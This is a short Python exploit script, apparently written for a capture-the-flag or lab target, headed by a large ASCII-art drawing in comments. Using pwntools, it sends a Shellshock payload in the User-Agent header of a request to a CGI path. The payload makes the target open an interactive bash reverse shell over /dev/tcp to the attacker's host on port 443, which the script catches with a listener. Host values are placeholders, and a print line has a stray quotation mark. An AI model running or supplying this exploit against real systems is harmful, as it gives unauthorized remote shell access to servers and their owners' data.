#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⣫⡿⠉⢻⣇⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠟⢁⡴⠋⠀⠀⠈⢿⡆⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠋⠁⣠⠞⠁⠀⠀⠀⠀⢸⣷⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡏⠀⠉⠳⢤⡉⠙⠻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠏⠁⠀⣰⠃⠀⠀⠀⠀⠀⠀⠈⣿⡆
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠙⠶⣄⠀⠉⠻⢷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣾⠟⠁⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠉⠛⢿⣶⣀⣤⣶⠶⠿⠟⠛⣿⠉⠉⠉⠉⠉⠙⠛⠳⠶⠦⣤⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⣀⡴⠿⠉⠉⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⢸⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⢀⣿⠇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡴⠀⠀⠀⠀⠀⠀⣠⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⢸⡟⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠹⣆⠀⠀⠀⠀⠀⣠⡴⠶⠖⠶⠶⢦⣀⠀⠀⠀⠹⣦⡿⠁⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣧⠀⠀⢠⡟⠀⠀⠀⠀⢀⣀⣠⠤⢤⣀⣀⠀⠀⠀⢀⡟⠀⠀⠀⠙⣦⠀⠀⣴⣟⣁⣀⣀⡀⠀⠀⠀⠈⠳⣆⠀⠀⠸⣷⡀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⣄⡿⠀⠀⠀⣠⠶⠋⠁⠀⠀⢀⣀⣉⡳⢦⣀⣾⠀⠀⠀⠀⠀⠘⢷⡾⡿⠚⠻⣿⣿⣿⣶⡄⠀⠀⠀⠸⡆⠀⠀⢹⣇⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⠁⠀⠀⣴⠋⠀⠀⠀⣠⣾⣿⣿⠋⠉⠳⣝⢧⡀⠀⠀⠀⠀⠀⡾⢻⣧⣀⣀⣿⣿⣿⣿⣿⡄⠀⠀⠀⡇⠀⠀⠸⣿⡄
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⢰⠇⠀⠀⠀⢰⣿⣿⣿⣿⣄⣀⣴⣿⠈⢷⠀⠀⠀⠀⣸⡃⠸⣿⣿⢿⣿⣿⠟⠉⣿⠁⠀⠀⢠⡇⠀⠀⠀⣿⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠘⣇⠀⠀⠀⢸⣿⠿⢿⣿⣿⠿⠿⣿⠀⠈⡇⠀⠀⠀⠙⣇⠀⠙⢧⣀⣀⣀⣠⠶⠃⠀⠀⣠⠟⠁⠀⠀⠀⣿⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠻⣄⠀⠀⠀⠻⣤⣀⣀⣀⣠⡶⠋⢀⣼⠃⣀⣀⣀⡀⠙⠶⢤⣀⣈⣉⣉⣁⣀⣤⠶⠾⢥⣀⣀⡀⠀⢠⣿⠁
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠉⠳⢤⣀⣀⠀⠉⠉⣉⣁⣠⠶⠚⠁⠀⠈⠙⡏⠁⠀⠀⠀⠈⠉⠉⡉⠉⠁⠀⠀⠀⠁⠀⠉⠉⠙⣻⡏⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⢀⣀⠶⠛⠉⠉⠉⠉⠉⢉⡀⠀⠀⠀⠀⠀⣠⢿⣄⠀⠀⠀⠀⢠⡟⠁⠀⠀⠀⠀⠀⡈⠉⠉⠉⢹⡿⠓⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⠴⠞⠋⠁⣀⡀⠀⠀⠀⠀⠀⠈⠳⣄⣀⣀⣠⠞⠁⠀⠈⠙⠲⠶⠖⠋⠀⠀⠀⠀⠀⠀⠈⠓⠶⢤⣰⣿⣃⡀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⡶⠚⠋⠉⢀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⢤⣀⣴⡟⠉⠙⠃⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣠⠶⠋⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣼⡿⠳⣦⣀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠙⠷⣄⣶⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠶⠛⠉⣿⠀⠀⠀⠉⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⢀⡶⠋⠉⢳⠶⠦⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡤⠴⠶⠒⠉⠉⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠐⠋⠀⠀⢀⡿⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠟⠀⠀⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠰⠶⠦⢤⣤⠤⠶⠖⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⣰⠞⠁⠀⠀⠀⠉⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⠿⡿⠀⠀⠀⠀⠀⣀⡤⠶⠋⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⣀⣴⡿⠛⠉⠀⢰⡧⠤⠶⠶⠒⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⣠⣾⠟⠉⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⣰⡿⠃⠀⠀⠀⠀⠀⣀⣘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⣀⡀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⢸⣿⠁⠀⠀⠀⠀⢰⡟⠉⠉⢹⡄⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠋⠉⠉⠉⠙⠶⣄⣷⣠⠶⠚⠉⠉⠉⠉⠙⠶⣤⣧⡴⠞⠋⠉⠉⠉⠙⠲⢦⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⢸⣿⠀⠀⠀⠀⠀⠸⣇⣀⣀⣀⣻⣄⣀⣀⣀⣀⣀⣰⣏⡀⠀⣴⠀⠀⣤⠀⠀⠈⣿⠁⠀⠀⣶⠀⠀⣤⠀⠀⠈⡿⠀⠀⢰⡀⠀⢠⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠸⣿⡆⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⢷⣼⠀⠀⣿⠀⠀⠀⣿⡀⠀⠀⢹⠀⠀⣿⠀⠀⠀⣷⠀⠀⢸⡇⠀⢸⠀⠀⠀⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠸⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠈⠻⣷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠈⠉⠻⠿⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, pdb, threading

def def_handler(sig, frame):
    print(""\n\n[!] Quit.\n")
    sys.exit(1)

# CTRL_C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://IPNUMBER/cgi-bin/PATH"
lport = 443

def shellshock():
    headers = {
        "User-Agent": "() { :; }; echo; /bin/bash -i >& /dev/tcp/IPNUMBER/443 0>&1"
    }
    r = requests.get(main_url, headers=headers)

if __name__ == '__main__':
    try:
        threading.Thread(target=shellshock, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
